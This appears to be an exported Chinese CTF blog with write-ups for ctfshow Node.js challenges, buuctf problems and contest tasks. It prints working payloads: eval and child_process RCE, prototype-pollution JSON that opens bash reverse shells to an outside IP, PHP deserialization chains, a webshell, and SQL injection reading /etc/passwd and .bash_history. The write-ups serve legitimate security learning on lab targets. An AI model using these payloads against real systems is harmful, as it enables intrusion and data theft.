Web-334(大小写)代码审计 给了账号和密码 账号是大写的CTFSHOW，但是输入的账号不能为大写，有个小写转大写的操作，输入ctfshow即可 Web-335(eval)eval()用法和php差不多 都是将字符串当作代码执行 这里nodejs执行命令类似于python 要调库 比如 python就要调包含目录执行的库，比如os，在nodejs里也是一样 不过这里都是通过require(&#39;模块&#39;)来调(不严谨 但是可以这么理解) payload:/?eval=require(&#39;child_process&#39;).execSync(&#39;ls&#39;) 可以参考nodejs中文网 但是其他命令执行函数比如exec()返回都是[object Object] 在这里只能用execSync Web-336解法一：设置了waf 读当前文件路径 这里fs模块负责读写文件 读当前文件 过滤了exec load 通过字符拼接绕过：?eval=require(&#39;child_process&#39;)[&#39;exe&#39;%2B&#39;cSync&#39;](&#39;ls&#39;) %2B是+的url编码 解法二：用fs模块读当前路径文件 直接读就行了 这里读路径和文件命令稍有不同 不过很好记 解法三： 利用编码绕过 Web-337(数组绕过)给了源码 类似于php的md5思路 可以看师傅的总结 tql： Web-336的编码绕过就是看了这个师傅的 Web-338(经典原型链污染)给了源码 当secert对象的ctfshow属性为题目所需值就给flag 那么就通过原型链污染Object的ctfshow属性 从而使得secert对象为所需值 可利用点为这个copy函数 跟踪一下 发现了原型链污染的经典语句 当时做这道题题目时候有个疑问就是为什么post传输的数据是在哪里接受到的，因为是零基础js，还在慢慢摸索，又去审了一次代码 整个语句都是router&#123;&#125;囊括起来的,并且是通过post传参，而且还加载了require(&#39;body-parser&#39;)中间键。 body-parser是非常常用的一个express中间件，作用是对post请求的请求体进行解析 。 除此之外为什么要用json格式传输，p神博客中也提及了，如果不用json文件发送那么__proto__就会被当作原型执行，导致污染失败，只有通过json格式提交，才会被当作key来执行，这样才能达到原型链污染的效果。 关于nodejs请求 可以参考这篇文章比较符合我这种新手： Web-339 (api)这道题目多了一个&#x2F;api路由 并且看到了render 多了一个模板渲染 发现Function 这里借用p神的理解 这里query没有被定义，就会在Object对象中寻找这个属性，那么我们就向上污染Object添加一个query属性就行了 。 这里提供三种payload: payload1: outputFunctionName是ejs引擎的一个属性 可以参考： payload2: 没有require，所以就用 global.process.mainModule.constructor._load来导入 child_process payload3: Function环境下没有require函数，不能获得child_process模块，我们可以通过使用process.mainModule.constructor._load来代替require。 然后flag藏在环境变量里 一开始被这个坑到了 Web-340(二次污染) 这里user为一个对象 他的属性userinfo也是一个对象 那么如果我们想通过copy函数通过user.userinfo污染到Object.prototype 即则user.userinfo-&gt;user(第一次污染)-&gt;Object(第二次污染)需要污染两次 路由&#x2F;api的思路和上一题一样 则可以用上题的payload，嵌套一个__proto__即可 &#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/124.221.177.174/7777 0&gt;&amp;1\\&quot;&#39;)&quot;&#125;&#125;&#125; Web-341(ejs模板)没了&#x2F;api路由 也没有了条件输出flag 看了wp是ejs的模板引擎的原型链污染rce 那么既然没有条件Function函数让我们执行命令，也没有输出flag，该怎么弄呢 整体分析可参考： 大致思路为：通过原型链污染 去覆盖这个模板渲染时的拼接代码，让其拼接进ejs模板代码种，从而渲染时进行RCE Web-342、343(jade模板)审计源码，发现换了模板引擎 思路与上面ejs模板相同 直接看师傅们的payload即可 &#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;: &#123;&quot;type&quot;:&quot;Block&quot;,&quot;nodes&quot;:&quot;&quot;,&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/124.221.177.###/7777 0&gt;&amp;1\\&quot;&#39;)&quot;&#125;&#125;&#125; &#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;type&quot;:&quot;Block&quot;,&quot;nodes&quot;:&quot;&quot;,&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/124.221.###.174/7777 0&gt;&amp;1\\&quot;&#39;)&quot;&#125;&#125;&#125; &#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;bash -c \\&quot; bash -i &gt;&amp;/dev/tcp/124.221.177.###/7777 0&gt;&amp;1\\&quot;&#39;)&quot;&#125;&#125;&#125; 注意这里有两个大坑 坑死我了 首先提交要post burp默认get 最坑的是Content-Type要改为 application/json玛德当时这里一直是默认的 一直没改 导致一直反弹失败 然后再来说说找flag的方法 直接cat /proc/self/environ去找 或者env|grep ctfshow 其实就是管道符把env的输出的内容当作grep(查找字符)的参数 其实本质上这两者是等价的 都是在环境变量种寻找flag Web-344(nodejs 解析特性)给了源码： 根据源码我们应该传 req.url.match(/8c|2c|\\,/ig)但是正则过滤了空字符 逗号以及其url编码 看了大佬的wp 应该这样传?query=&#123;&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;ctfshow&quot;&amp;query=&quot;isVIP&quot;:true&#125; url编码之后传上去 nodejs中会把这三部分拼接起来 被传入之后req.query被解析成了一个数组，之后在JSON.parse的解析下变成了对象，就变成了我们想要的结果了。"},{"title":"贵阳大数据及网络安全精英对抗赛WEB部分WP","date":"2023-05-09T03:41:48.000Z","url":"/post/232bb69.html","tags":["Fast destruct","nodejs 原型链污染"],"categories":["各赛事WP"],"content":"贵阳大数据及网络安全精英对抗赛WEB部分WP 仔细ping有点看不懂的一道题目，ip去ping，返回和我们本地ping网站差不多的回显，刚开始是以为用逻辑符|&amp;&amp;之类的题目来做，后来发现想复杂了，他题目意思好像只能用他指定的命令，除此之外其他字符一律屏蔽 比如 ?ip=ls就可以合法，但是如果?ip=l一个字符也会被屏蔽，蛮nt的说实话。 payload:?id=ls 发现本地有flag.php 直接 ?id=nl flag.php pop 整个链子其实不难 当时做这道题目 本地pop链已经写出来了 但是发现没法触发 然后就会发现throw new Error(&quot;NoNoNo&quot;);会挡在前面没法绕过，当时就寄了。 这里考到了fast destruct的知识点 出自： 其实原理还是蛮容易理解的，当一个对象生命周期结束时，最后就会触发析构函数，但是如果我们提前破坏这个序列化后的结构，那么就会提前进入析构函数 这道题目就是因为throw new Error(&quot;NoNoNo&quot;);而进不去我们构造的链子 但是如果我们破坏我们payload链子结构 那么就会提前进入析构函数 从而触发链子 payload：?bbb=O:2:&quot;TT&quot;:2:&#123;s:3:&quot;key&quot;;O:2:&quot;JJ&quot;:1:&#123;s:3:&quot;obj&quot;;O:2:&quot;MM&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;system&quot;;s:1:&quot;c&quot;;s:6:&quot;whoami&quot;;&#125;&#125;s:1:&quot;c&quot;;N;&#125; 这样是完整链子没法触发的我们可以删除最后一个&#125;破坏结构让他提前进入析构函数 成功 完美网站一道很臭的题目，大概题目思路是他给了一个img参数是一个图片格式base64编码 然后还需要提交一个n参数 但是n是一个10-30的随机数字 并且每次都不一样 那么其实思路很简单直接爆破就行了 并且要同时提交img和n 但是这描述我也是无语 然后当时没发现flag文件名藏在他给的img末尾是ffffpq.php 所以一直在找flag 总之做的很恶心人 像吃了屎一样yue了 notrce好像我没记错应该是这道题目 源码如下 蛮玄幻的一道题目 看了wp直接用将根目录flag复制到当前目录访问就行 呢如果flag文件目录不是常规命名 这不就寄了吗 之后了解到是非预期解 哦 那没事了:) JUST_PROTO一道我未触及的领域的题目 一道nodejs的原型链污染题目 这两天恶补了一下关于原型链污染的知识点，感受颇深 如果之前了解过这个 其实题目一眼丁真就能看出是原型链污染的题目 __proto__明显就提示了 给出源码： 先看&#x2F;bkup路由 发现了我们最喜欢的exec()函数 const cmd = ba.redis_set + date $&#123;date_stream.toString(&#39;base64&#39;)&#125;; 然后这部分ba.redis_set如果我们可控则能达到rce 再来看&#x2F;set路由 通过get方式给token,key,var传参 date[token][key] = val;因为三个参数我们都可控，则可以进行原型链污染 这里解释一下为什么会是data[token][key]的形式，我们一般认为应该是data.token.key的形式 其实这两种形式是相等的都可以 比如ctfshow有题目的payload： 原本是：?eval=require(&#39;child_process&#39;).execSync(&#39;ls&#39;) 如果改为?eval=require(&#39;child_process&#39;)[&#39;execSync&#39;](&#39;ls&#39;)那么都是可以的，两种都是等价的 回到原题，使得token=__proto__,key=redis_set,var=shell 则ba.redis_se被污染 解释一下为什么要用 bash -c 由于我们是在外部运行shell指令，所以他默认是不会识别我们的bash -i反弹shell的，bash -c保证了命令使用bash shell去执行 反弹shell部分用url编码一下 bash -c就是将后面字符串当作命令读入执行 然后输出 it’s time经典flask的ssti 直接当个脚本小子，大脚本注入 或者去找ctfshow 题目的payload都可以"},{"title":"buuctf-68-[MRCTF2020]套娃","date":"2023-05-06T08:54:34.000Z","url":"/post/b79f6776.html","tags":["php字符串解析特性"],"categories":["buuctf"],"content":"[MRCTF2020]套娃 进入题目 查看源码 分析：输入的字符串不能有_和其url编码，并且get传参b_u_p_t不能等于23333 但是正则匹配需要开头和结尾为23333 这里用到了php合法变量名的知识点，如果在传参时，遇到不合法的变量名比如.则php会自动将其转为_ 正则匹配preg_match()通过换行符%0a绕过即可 在非多行模式下，$似乎会忽略在句尾的%0a 可参考 payload:?b.u.p.t=23333%2a 查看源码发现一段jsfuck编码 直接在console中输入就有回显了 关于jsfuck码可以参考： 获得源码: ip用 Client-ip: 127.0.0.1写在请求头，并且只能用这个 到目前为止我也不知道 Client-ip xff Real-ip 这三个在不同题目下为什么不能互用的原因 有点阴间 2333用data伪协议去传参 我们要读的文件file会经过change函数改变 我们只需要倒着写一个change函数 让其进过题目函数时候回到我们想要的内容即可 脚本很简单 "},{"title":"buuctf-66-[极客大挑战 2019]RCE ME","date":"2023-05-06T07:31:18.000Z","url":"/post/7f59ce0.html","tags":["RCE奇淫方式"],"categories":["buuctf"],"content":"[极客大挑战 2019]RCE ME 这道题就是通过取反构造无数字字母rce的 其实这种构造奇淫rce的 明白原理之后 直接当个脚本小子做起题来嘎嘎快 生成脚本如下： 直接构造system(&#39;ls&#39;)发现不可以 就很奇怪 构造phpinfo()找不到思路就去看看配置文件 这个真的很重要 payload:?code=(~%8F%97%8F%96%91%99%90)(); 发现原来是好多函数被禁了 难怪执行不了 构造assert(eval($_POST[x]))生成一句话木马用蚁剑去连接 注意这种eval()中再嵌套一个assert(eval())的方式 有时候可以绕过waf payload: ?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%87%A2%D6); 接下来的思路就是怎么绕过disble_function 具体方式可以看我这一篇文章 这里就不赘述了  "},{"title":"buuctf-64-[0CTF 2016]piapiapia","date":"2023-05-05T13:26:16.000Z","url":"/post/6e80c399.html","tags":["反序列化字符串逃逸","反序列化","代码审计"],"categories":["buuctf"],"content":"[0CTF 2016]piapiapia 一道php反序列化字符串逃逸的题目，需要代码审计，tql！ 捋清思路：首先注册一个账号，然后登录，发现有个文件上传地方，刚开始以为是传木马，然后去连，getshell但后面发现新大陆，一顿操作之后，发现需要扫网站，下载源码。 下载下来6个php文件 在config.php中发现有flag 但是被删除了 然后register.php与index.php都是一些基础的注册账号与登录账号的操作 然后由index.php转向update.php 也就是我们看到的这个界面 简单看一下就是通过post获取变量值，和一些简单的判断输入是否合法的语句，注意一下nickname(昵称)的判断 nickname不能超过10个字符，之后会提及 然后传入update_profile() 这里$profile数组是我们通过序列化传入的，这里很重要 之后传入class.php 直接定位到update_profile函数 这里通过继承类，调用父类的filter函数 这里相当于一个过滤器 重点看第二个正则 如果我们传入的字符串有&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;则会被替换为hacker 至此暂时结束 当我们上传完update.php需要的信息之后会跳入profile.php 这里终于看到了我们常见的漏洞点file_get_contents()函数 先经过反序列化$profile数组 然后base64编码读出$profile[&#39;photo&#39;] 之前看到config.php中含有flag 那么我们可以让$profile[&#39;photo&#39;]=config.php不就可以拿到flag了 解题：但是photo部分是文件上传部分，并不能直接让他等于config.php去拿到flag 这里就要用到反序列化字符串逃逸了 在整个过程中存在序列化与反序列化，我们可以在nickname部分构造出符合反序列化的字符串，在nickname存在config.php让其反序列化到后边的photo部分，相当于提前结束反序列化，让原本photo部分的反序列化部分丢失，从而达到使得$profile[&#39;photo&#39;]=config.php 那么我们需要在nickname序列化后的部分塞入&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;共33个字符 这里构造合法反序列化部分很巧妙 之前看代码它存在一个过滤器 如果我们只是单纯把&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;这一部分塞入nickname那么它经过序列化后，再经过反序列化全部部分还是属于nickname部分，我们就需要在他序列化后构造让他字符串溢出，然后溢出部分就会到photo部分 我们可以让nickname=where然后序列化后经过过滤器where会被替换为hacker,where为5个字符，而hacker为6个字符，多出一个字符，就这样使得它在反序列时还是按照原本5个字符去反序列化，还有一个字符就溢出逃逸了。 可以简单借助下面的脚本理解： 输出：这里第二行hacker明明是6个字符但是在序列化字符串中还是显示5，那么多余出来的一个字符将会在反序列化过程中逃逸。 那么我们塞入字符串&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;是33个字符，则需要33个where 但是之前看到nickname部分不能超过10个字符 这里可以通过数组方式绕开正则匹配即nickename[] 这里$profile已经是一个数组了，如果数组里面再包含一个数组，那么序列化后的字符串稍有不同。 通过一个脚本来帮助理解： 输出： 会有花括号去包裹数组中的数组部分，那么我们在闭合nickname这部分时也需要特意构造一个右花括号去闭合，使其成为合法反序列化部分。 即&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;我们需要塞入34个字符 那么nickname就需要有34个where 其他部分任意 进入profile.php去解码这段base64 就可以拿到flag "},{"title":"buuctf-63-[SUCTF 2019]Pythonginx","date":"2023-05-04T14:37:48.000Z","url":"/post/487317b8.html","tags":["python","nginx"],"categories":["buuctf"],"content":"[SUCTF 2019]Pythonginx 一道关于python解析idna编码与utf-8解码后的字符串的漏洞题目 CVE-2019-9636：urlsplit 不处理 NFKC 标准化 CVE-2019-10160：urlsplit NFKD 标准化漏洞 源码： 完整分析过程： 这里说说host与hostname吧 host=hostname+&#39;:&#39;+port(not 80) 如果http使用默认的80端口，host可以省略掉冒号+端口，看上去和hostname一样 这一行获取我们的hostname 并且需要有协议才行 比如https:&#x2F;&#x2F;,http:&#x2F;&#x2F;,或者file:&#x2F;&#x2F;，这样才能获取到我们的hostname，也就是payload形式，必须也是这样包含协议的形式 具体分割部分，可以去看官方手册 输出： 目标绕开第一第二个if，那么操作点就在这里 比如℆ 这个字符经过以上操作之后就变为了c&#x2F;u 那么我们就可以让题目需要的suctf.cc改为suctf.c ℆ 然后经过idna编码utf-8解码后，变为我们需要的suctf.cc&#x2F;u 还需要了解一些关于nginx的重要文件位置： 配置文件存放目录：&#x2F;etc&#x2F;nginx 主配置文件：&#x2F;etc&#x2F;nginx&#x2F;conf&#x2F;nginx.conf 管理脚本：&#x2F;usr&#x2F;lib64&#x2F;systemd&#x2F;system&#x2F;nginx.service 模块：&#x2F;usr&#x2F;lisb64&#x2F;nginx&#x2F;modules 应用程序：&#x2F;usr&#x2F;sbin&#x2F;nginx 程序默认存放位置：&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html 日志默认存放位置：&#x2F;var&#x2F;log&#x2F;nginx 配置文件目录为：&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf 先来找flag文件的位置，看了wp payload:?url=℆sr/local/nginx/conf/nginx.conf 读就行了?url=℆sr/fffffflag"},{"title":"buuctf-62-[BJDCTF2020]EasySearch","date":"2023-05-02T14:55:15.000Z","url":"/post/9c6e15d.html","tags":["ssti","shtml"],"categories":["buuctf"],"content":"[BJDCTF2020]EasySearch 扫网站后台，buu常常扫不出来算了，直接从网上扒一个 发现有&#x2F;index.php.swp 源码如下： 需要密码前六位md5值等于6d0bc1 借助脚本 随便选一个 2020666 看到这里大概率是ssti 但是抓包看既不是python也不是php 所以不会了 看了wp 才发现是没见过的shtml 其实在源码中也有稍微提示 第17行$shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;); 直接用payload payload： flag在上层目录 "},{"title":"buuctf-55-[CISCN 2019 初赛]Love Math","date":"2023-05-02T13:31:24.000Z","url":"/post/102492d1.html","tags":["RCE奇淫方式","命令执行","bypass"],"categories":["buuctf"],"content":"[CISCN 2019 初赛]Love Math 这道题就是bypass 利用进制转换函数构造rce 挺不错的 源码如下: 解法一：利用进制转换函数 payload:c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;cos&#125;)&amp;pi=system&amp;cos=cat /flag 分析： c=$pi=base_convert(37907361743,10,36)(dechex(1598506324))这一步是构造出_GET 这里用36进制原因是包含数字字母多可以构造函数名很方便 选择hex2bin这个函数是因为这个函数可以将16进制字符串转化为2进制字符串，这里可以这么理解我们常见到的字符串就是2进制的字符串（不严谨），这里面起了一个相当于将16进制转化为字符串的作用 大概如图这样的作用 拆解： 注意这里$pi和pi是两个不同的概念，一开始搞混了，至于这里为什么选择pi和cos作为参数名是因为这两个函数名占位最少，因为限制我们长度必须在80以内 解法二利用getallheaders()函数 返回一个数组 paylaod:?c=$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;) 相当于构造exec(getallheaders()&#123;1&#125;) 因为返回一个数组所以原来应该为getallheaders()[1]因为[]被屏蔽了,所以用&#123;&#125;bypass 然后1为键名 所以在请求头增加一个1: cat/flag即可 "},{"title":"AntCTF x D³CTF简单复现","date":"2023-05-02T05:01:11.000Z","url":"/post/e2c24be6.html","tags":["命令执行"],"categories":["各赛事WP"],"content":"菜鸡的自我羞辱 前言有稍微看了下这个比赛，一眼就不属于我这个水平人做的，稍稍看了一道披着web皮的misc，感觉稍微有点思路，赛后看看大佬们的wp，给自己涨涨见识。 正题d3readfile(Misc)老套路先读读/etc/passwd可以读到 再看看环境变量 发现hint 解码发现提示 提示关键字是locate 看了大佬的wp：locate 命令是查询文件所在位置的，会在本地缓存数据库，文件名为:locate.db,不同版本似乎缓存的目录并不一样 问问chatgpt 不同的linux系统位置不同 Ubuntu &#x2F; Debian：&#x2F;var&#x2F;lib&#x2F;mlocate&#x2F;mlocate.db CentOS &#x2F; Fedora &#x2F; RHEL：&#x2F;var&#x2F;lib&#x2F;locatedb Arch Linux：&#x2F;var&#x2F;lib&#x2F;pacman&#x2F;local&#x2F;mlocate*&#x2F;mtree Gentoo: &#x2F;var&#x2F;cache&#x2F;edb&#x2F;locate.database Slackware: &#x2F;var&#x2F;lib&#x2F;slocate&#x2F;slocate.db FreeBSD: &#x2F;var&#x2F;db&#x2F;locate.database OpenSUSE：&#x2F;var&#x2F;lib&#x2F;slocate&#x2F;slocate.db Mageia：&#x2F;var&#x2F;lib&#x2F;mageia&#x2F;mlocate.db Oracle Linux：&#x2F;var&#x2F;cache&#x2F;locate&#x2F;locatedb 最后发现是 发现flag路径：opt/vwMDP4unF4cvqHrztduv4hpCw9H9Sdfh/UuRez4TstSQEXZpK74VoKWQc2KBubVZi/LcXAfeaD2KLrV8zBpuPdgsbVpGqLcykz/flag_1s_h3re_233 Get it! d3cloud(Web)这题看大佬WP是unzip处命令注入 界面ui什么用都没有 直接进admin后台 /admin 要登陆 admin/admin 发现一个php文件 这里看wp是与官方文档相比多了点代码，那么做这道题还需要现场搭环境和代码审计qwq tql 是这里存在命令注入 看大佬分析unzip命令如下： 然后利用zip文件名写shell 简单解释一下 将ls /结果重定向到/var/www/html/public/ls.txt文件中 这里必须有换行符 不然写不进入 估计是代码审计中文件名处有转义或者别的操作 通过换行绕过 还有一个疑问就是写入文件的路径是怎么获取的？是自己搭环境弄到的吗qwq 直接访问ls.txt 继续和上面一样的操作 小总结一下：很多难题还是需要获取到相关版本后，需要自己本地搭建去调试，才能慢慢发现漏洞 代码审计能力很重要qwq 尾巴其他的wp都看不懂 还是慢慢来吧 看了一下这种真正难的ctf 大大的寄写在我脸上 "},{"title":"buuctf-52-[网鼎杯 2020 朱雀组]Nmap","date":"2023-05-01T06:53:11.000Z","url":"/post/c93f1585.html","tags":["nmap","esc***函数"],"categories":["buuctf"],"content":"[网鼎杯 2020 朱雀组]Nmap 看题目是一道关于nmap的题目 试试127.0.0.1 再来试试我本地kali的nmap 几乎是一样的 估计就只是放了个接口 nmap 命令可以将扫描结果保存在文件里面 就可以想到写一句话木马 这里屏蔽了php 并且 escapeshellarg()与escapeshellcmd()函数处理保护 与之前做的有道题目很相似 可以用空格与单引号绕过 选项： 最终payload： 之后rce就行了"},{"title":"buuctf-96-[GYCTF2020]EasyThinking","date":"2023-04-29T13:20:55.000Z","url":"/post/db3afe26.html","tags":["bypass","thinkphp"],"categories":["buuctf"],"content":"[GYCTF2020]EasyThinking 看标题是一个关于thinkphp的漏洞 先随便乱输，发现是thinkphp6 上网查一下漏洞，发现存在一个任意文件创建漏洞 （参考：） 先注册一个账号 然后登录抓包 修改phpsessid这里 这里可以随便输入，然后会在/runtime/session/sess_刚刚输入的32字符生成一个文件 这里之后我们要进行命令执行，所以最好将字符串设为带有php后缀的文件 然后在搜索这里上传我们的一句话木马 蚁剑连接  getshell之后发现读不了flag 查看phpinfo()之后发现禁用了很多函数，做到这里和之前buu有道题目很像，有两种做法 第一种解法 蚁剑插件 第二种解法 上传一个绕过disable_functions的脚本exp：7.3的版本 这里要注意php版本 不同版本对应的脚本不同 将这个脚本上传上去 这里最好是到 &#x2F;var&#x2F;tmp 或者 &#x2F;tmp 这两个路径是用户用于存储临时性的文件，亦经常被程序读写用户存储临时性数据，本质上没区别，既然是用户存储临时性数据，我们一般是有写文件权限的。 可以在我的centos7上看看 可以看到这两种路径的默认权限是777 上传成功 之后再去包含他 成功~ "},{"title":"buuctf-91-[NPUCTF2020]ezinclude","date":"2023-04-29T13:06:32.000Z","url":"/post/da0771e5.html","tags":["php临时文件包含"],"categories":["buuctf"],"content":"[NPUCTF2020]ezinclude 一道php文件临时包含的题目，之前没见过 进入之后 根据提示 给pass传一个hash值 可以抓包看到 然后直接在bp里操作就行，不然网页会挑战到一个404网页 存在文件包含 一般这种flag文件名称会被改写成奇奇怪怪的形式，靠猜是猜不到的 读一下当前页面的源码吧 用一下伪协议 构造payload：?file=php://filter/read=convert.base64-encode/resource=flflflflag.php 发现data input zip协议都被河蟹了 没办法直接命令执行 源码如下 扫一下网站 发现还有config.php 里面是假的flag 还有一个dir.php 内容如下： 发现这个文件可以帮我们扫&#x2F;tmp的文件目录 这个目录是存储用户临时文件的地方 我们对他有写权限 这里用到了 php临时文件包含的漏洞 具体参考（） php7.0的bug： 使用php://filter/string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破就可以getshell,这个崩溃原因是存在一处空指针引用。 该方法仅适用于以下php7版本，php5并不存在该崩溃。 • php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复 • php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复 • php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复 利用大佬现成的脚本 之后再去看看dir.php 发现我们的恶意文件已经被上传 再去包含一下我们的文件 "},{"title":"buuctf-90-[NCTF2019]SQLi","date":"2023-04-29T12:36:00.000Z","url":"/post/4f5e876.html","tags":["sql注入","sql bypass","sql正则注入"],"categories":["buuctf"],"content":"[NCTF2019]SQLi sql注入 fuzz一下发现屏蔽了很多的sql常用命令 扫服务器后台发现hint.txt 也就是当我们获得admin的密码时，就能获得flag，连admin都被黑名单了，显然是不想让我们通过常用的手段去注入 回到主页看到他已经给了我们系统的查询语句 这里是不是就能想到通过巧妙的闭合改变查询语句使得我们的恶意注入语句就能被调用 看了大佬的wp发现是正则注入 regexp 本地测试 能看出无论username的内容是否在这个表单中，因为有||（相当于逻辑或） 当password=&quot;^1&quot;也就是以1开头 之后以12开头，利用这样的正则匹配去一位一位的试探，思路类似于布尔盲注，根据回显来判断。 回到题目，应该怎么构造呢 题目sql里的查询语句为： 可以构造username=\\&amp;passwd=||sql;%00 空格被河蟹了可以用/**/绕过 注释符# -- %00来绕过本质上是截断 这里末尾的封号实际上是sql语句里的 因为很多程序底层都是c语言编译的，c语言对于一个字符串到末尾的标识是是否检测到\\0经过url加密后即为%00 放入原语句后为：select * from users where username=&#39;\\&#39; and passwd=&#39;||sql;%00&#39; 相当于username中的语句为&#39; and passwd =内容不重要 然后逻辑或 加上我们的sql注入的恶意语句 如果回显正常为会定向到welcome.php 根据思路写出脚本 这里注意一下：如果在登录框里面敲%00 那样会导致%00被转义而失去作用 在python脚本里面 我们用parse.unquote(‘%00’)表示不进行转义的%00 这样就能爆出密码 "},{"title":"buuctf-88-[网鼎杯 2018]Comment","date":"2023-04-29T11:03:43.000Z","url":"/post/3a0e9ae9.html","tags":["sql注入","源码泄露"],"categories":["buuctf"],"content":"[网鼎杯 2018]Comment 这是一道关于sql二次注入的题目 第一次遇到二次注入的题目蛮不错 进入之后，是一个类似于留言板的界面 需要先登录 然后形式是密码最后三位纯数字不知道 通过bp爆破一下就出来了 密码结尾是666 进入之后f12 发现提示 存在git源码泄露的 直接上githack 发现源码 但是发现源码不全 用git log或者 git log --reflog找到原来的代码然后恢复 但是我这里没有复现成功 一直报错 找了好久没发现是什么原因 无果只能再去寻找别的方法 然后发现了另一个 提取远程 git 泄露或本地 git 的工具 git_extract 可以说是增强版 源码地址： 调用的时候 要用python2 因为这是python2的脚本 发现了更早的源码 分析： 存在两个表 board 和 commet 并且 $sql = &quot;select category from board where id=&#39;$bo_id&#39;&quot;;当我们评论时候还会调用board表 再来看 $category,$content是我们可控的。且最后显示的是content，我们可以尝试闭合content &#x3D; ‘$content’ 举例当我们去发帖语句为 category 为&#39;,content=user(),/*其它随意，然后去详情里面评论*/# 这样就会回显我们当前用户信息 然后语句会被拼接成下面这样 即原来的content内容被我们用注释/**/给注释了 我们自己可以创建一个content从而达到我们想要的语句 构造payload:&#39;,content=user(),/* 发现是root权限 这可太行了 直接用load_file()函数去读文件 构造payload:123&#39;,content=((select(load_file(&quot;/etc/passwd&quot;)))),/* 闭合进去之后就会变成category=&#39;&#39;直接为空字符 可能会无回显 发现成功读取 看到最后一行 发现存在www用户 那么这是什么呢 一般我们在linux下安装web开设靶场 一般默认系统web用户会为www 一般增加的用户信息会在&#x2F;home路径下 root本身的信息会在根目录&#x2F;root路径里 比如我曾经在我的centos7上装过小皮面板 就会有个www用户默认在我的&#x2F;home路径下（那个apple用户是我当时创建的用户 ） 并且能看到地址目录为：&#x2F;home&#x2F;www 构造payload:123&#39;,content=((select(load_file(&quot;/home/www/.bash_history&quot;)))),/* 这里.bash_history文件是什么呢 一般在linux 以.开头的都是隐藏文件 在终端敲过的命令，linux是有记录的，默认可以记录500条历史命令。这些命令保存在用户的宿主目录中的.bash_history文件中。 拿我本地apple用户来说，如下 我曾经修改过apple用户的密码 所以有记录 回到题目得到 看到记录有依次如下操作： cd /tmp unzip html.zip rm -f html.zip cp -r html /var/www/ cd /var/www/html/ rm -f .DS_Store service apache2 他只删除了在&#x2F;var&#x2F;www&#x2F;html下的 .DS_Store文件 原来路径下的.DS_Store文件还保存着 我们可以读取，并且里面内容读出来大多数是乱码 最好以hex()函数也就是16进制读出来 .DS_Store(英文全称 Desktop Services Store)是一种由苹果公司的Mac OS X操作系统所创造的隐藏文件，目的在于存贮目录的自定义属性，例如文件们的图标位置或者是背景色的选择。相当于 Windows 下的 desktop.ini。 构造payload：test&#39;,content=((select(hex(load_file(&quot;/tmp/html/.DS_Store&quot;))))),/* 发现了flag文件名 flag_8946e1ff1ee3e40f.php 然后去读取 构造payload：test&#39;,content=((select(hex(load_file(&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;))))),/* 转码得到flag "},{"title":"buuctf-86-[GYCTF2020]Ezsqli","date":"2023-04-29T10:21:07.000Z","url":"/post/d359692.html","tags":["sql注入","sql bypass"],"categories":["buuctf"],"content":"[GYCTF2020]Ezsqli 一眼丁真，鉴定为sql盲注。 爆库： 库没用其实，之后可以用database()代替 而且and也是被河蟹了 give_grandpa_pa_pa_pa 库名用不了的 爆表：因为or被河蟹 所以不能用information_schema来查询 用sys.x$schema_flattened_keys来代替 参考： 使用二分法改进后： 爆flag这里用到了列比较去试flag 0^((1,&#39;&#123;0&#125;&#39;)&gt;(select * from f1ag_1s_h3r3_hhhhh)) 这里的 1是猜测第一列一般为索引id 1，因此在这里用1，之后就是去慢慢写脚本去试字符，这里写脚本的时候要加上之前已经爆出的字符慢慢去比较。 "},{"title":"buuctf-85-[HFCTF2020]EasyLogin","date":"2023-04-29T10:16:56.000Z","url":"/post/a8c0011c.html","tags":["jwt"],"categories":["buuctf"],"content":"[HFCTF2020]EasyLogin 一道关于jwt认证的题目 之前有做过相同的题目 申请一个账号登录 然后就是一个获取flag的输入框 但是我们普通身份肯定是获取不到的 这里我试了试申请admin账号发现不行 做到这里估计是后面大概率是要伪造身份为admin然后getflag 查看源码发现是用koa框架 然后看了一下别人的wp这个框架是用jwt鉴权的 关于鉴权可以看这篇文章 登录抓包 将其放入 自动帮我们生成相关信息 JWT(json web token)的三个部分依次如下：（参考：） Header（头部） Payload（负载） Signature（签名） 